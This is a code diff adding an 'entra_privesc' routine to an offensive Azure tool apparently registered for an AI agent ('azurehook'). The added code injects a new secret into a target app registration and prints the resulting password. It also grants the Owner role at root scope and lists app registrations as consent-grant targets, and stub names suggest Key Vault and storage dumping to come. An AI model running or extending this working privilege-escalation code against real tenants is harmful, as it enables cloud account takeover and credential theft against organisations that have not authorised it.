@@ -121,6 +121,38 @@ async function entraEnum(args: string[], timeout: number): Promise<HookResult> {
   return { output: output.join("\n"), findings }
 }
 
+async function entraPrivesc(args: string[], timeout: number): Promise<HookResult> {
+  const method = argVal(args, "--method")
+  if (!method) return { output: "ERROR: --method required (consent_grant|sp_secret|role_assign)", findings: [] }
+  const targetId = argVal(args, "--target-id")
+
+  if (method === "sp_secret") {
+    if (!targetId) return { output: "ERROR: --target-id (app object ID) required for sp_secret", findings: [] }
+    const r = await run("az", ["ad", "app", "credential", "reset", "--id", targetId, "--append", "-o", "json"], timeout)
+    if (r.exitCode === 0) {
+      const cred = tryJson(r.stdout)
+      return { output: `[+] Secret injected into app ${targetId}\n    appId: ${cred?.appId}\n    password: ${cred?.password}\n    tenant: ${cred?.tenant}`, findings: [] }
+    }
+    return { output: `[-] Failed: ${r.stderr.trim()}`, findings: [] }
+  }
+
+  if (method === "role_assign") {
+    if (!targetId) return { output: "ERROR: --target-id (principal ID) required for role_assign", findings: [] }
+    const r = await run("az", ["role", "assignment", "create", "--assignee", targetId, "--role", "Owner", "--scope", "/", "-o", "json"], timeout)
+    if (r.exitCode === 0) return { output: `[+] Owner role assigned to ${targetId}`, findings: [] }
+    return { output: `[-] Failed: ${r.stderr.trim()}`, findings: [] }
+  }
+
+  if (method === "consent_grant") {
+    const apps = await run("az", ["ad", "app", "list", "--query", "[].{id:id,name:displayName,appId:appId}", "-o", "json"], timeout)
+    if (apps.exitCode !== 0) return { output: `[-] Cannot list apps: ${apps.stderr.trim()}`, findings: [] }
+    const al = tryJson(apps.stdout) || []
+    return { output: [`[*] ${al.length} app registration(s) — review for consent grant targets:`, ...al.slice(0, 10).map((a: { name: string; appId: string }) => `    ${a.name} (${a.appId})`)].join("\n"), findings: [] }
+  }
+
+  return { output: `ERROR: Unknown method: ${method}`, findings: [] }
+}
+
 // ── Tool definition ──
 
 const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]
@@ -151,7 +183,7 @@ export const AzurehookTool = Tool.define("azurehook", {
 
     const dispatch: Record<Program, () => Promise<HookResult>> = {
       entra_enum: () => entraEnum(params.args, params.timeout_seconds),
-      entra_privesc: () => stub("entra_privesc"),
+      entra_privesc: () => entraPrivesc(params.args, params.timeout_seconds),
       keyvault_dump: () => stub("keyvault_dump"),
       storage_dump: () => stub("storage_dump"),
       managed_identity: () => stub("managed_identity"),
